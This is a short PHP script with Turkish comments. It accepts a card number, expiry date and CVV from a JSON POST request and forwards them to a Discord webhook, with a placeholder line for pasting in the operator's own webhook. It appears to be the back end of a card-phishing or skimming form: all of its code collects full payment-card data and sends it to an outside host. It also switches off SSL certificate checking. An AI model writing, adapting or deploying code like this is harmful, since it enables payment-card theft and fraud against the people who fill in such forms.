<?php
// JSON formatında gelen veriyi alıyoruz
$data = json_decode(file_get_contents('php://input'), true);

// Form verilerini alıyoruz
$cardNumber = $data['cardNumber'];
$expiryDate = $data['expiryDate'];
$securityCode = $data['securityCode'];

// Discord Webhook URL'nizi buraya yapıştırın
$webhookUrl = 'your webhok here';

// Mesaj içeriğini oluşturuyoruz
$message = [
    "content" => "Yeni bir ödeme bilgisi alındı:",
    "embeds" => [
        [
            "title" => "Ödeme Bilgileri",
            "fields" => [
                [
                    "name" => "Kart Numarası",
                    "value" => $cardNumber,
                    "inline" => true
                ],
                [
                    "name" => "Son Kullanma Tarihi",
                    "value" => $expiryDate,
                    "inline" => true
                ],
                [
                    "name" => "CVV/CVC",
                    "value" => $securityCode,
                    "inline" => true
                ]
            ]
        ]
    ]
];

// Webhook URL'ine JSON verisini göndermek için cURL kullanıyoruz
$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));

// Eğer SSL doğrulama hatası alıyorsanız aşağıdaki satırı ekleyebilirsiniz
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);

// Eğer hata varsa ekrana yazdırıyoruz
if(curl_errno($ch)) {
    echo json_encode(['status' => 'error', 'message' => curl_error($ch)]);
} else {
    echo json_encode(['status' => 'success', 'message' => 'Mesaj gönderildi!']);
}

curl_close($ch);
?>
